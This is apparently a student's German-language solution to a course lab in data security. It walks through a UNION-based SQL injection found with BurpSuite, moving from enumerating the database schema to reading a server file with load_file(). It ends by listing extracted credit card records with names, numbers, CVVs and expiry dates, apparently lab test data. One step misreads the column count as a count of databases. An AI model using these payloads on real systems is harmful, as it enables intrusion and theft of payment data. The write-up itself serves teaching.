# Lösung zur praktischen Aufgabe im Modul Datenschutz und Datensicherheit bei Herrn Prof. Dr. Wojciech Dabrowski

1. Erster Schritt bestand darin die Webseite auf Schwachstellen zu untersuchen. Zuerst schien mir der Login verdächtig, dort wurden allerdings keine Injektion notwendige Symbole erlaubt.

2. Mit BurpSuite konnte ich bei manueller Eingabe von `'` einen error in dem Feld für die Ausgabe der immobilien und damit eine für SQL injection mögliche Schwachstelle erkennen. BurpSuite besitzt eine "Repeater" Funktion mit der man requests senden kann. Es ist möglich die reqeuests manuell zu manipulieren.

3. `' UNION SELECT 1, 2, 3, 4 #` ist die einzige Injektion für das herausfinden der Anzahl der Datenbanken, die keine Fehlermeldung gibt, deswegen muss es vier Datenbanken geben.

4. `' UNION SELECT DISTINCT table_schema, 0, 0, 0 from information_schema.tables #` zeigt alle Namen der Datenbanken (information_schema, performance_schema, dre, mysql).

5. `' UNION SELECT DISTINCT table_name, 0, 0, 0 from information_schema.tables WHERE table_schema="dre" #` zeigt die Tabellen der jeweiligen Datenbanken. Hierbei habe ich die Namen von allen Schemas angeschaut. "Paymentfiles" klang am ehesten nach Kreditkarten Informationen.

6. `' UNION SELECT DISTINCT column_name, 0, 0, 0 from information_schema.columns WHERE table_schema="dre" AND table_name="paymentfiles" #` zeigt die Spalten der Tabelle "paymentfiles" an. Dabei gibt es die relevante Spalte "location".

7. `' UNION SELECT 0, location, 0, 0 from paymentfiles #` enthält "/var/www/creditcarddata_details.csv".

8. Das auslesen der Datei geht mit `' UNION SELECT 0, load_file('/var/www/creditcarddata_details.csv'), 0, 0 #`. Die Datei enthält die gesuchten Kreditkarten Informationen: Emily,Cook,4024382370464097,159,07/2026,127000.00
   Otto,McGuire,4949539433727040,717,08/2026,3477000.00
   John,Warren,4472395893843453,456,02/2026,549999.99
   Adam,Holloway,5218545241887612,251,11/2027,22500.00
   Paul,Sullivan,5544369074197162,329,08/2027,570200.00
   Otto,Boone,5142241829728565,955,01/2027,250.00
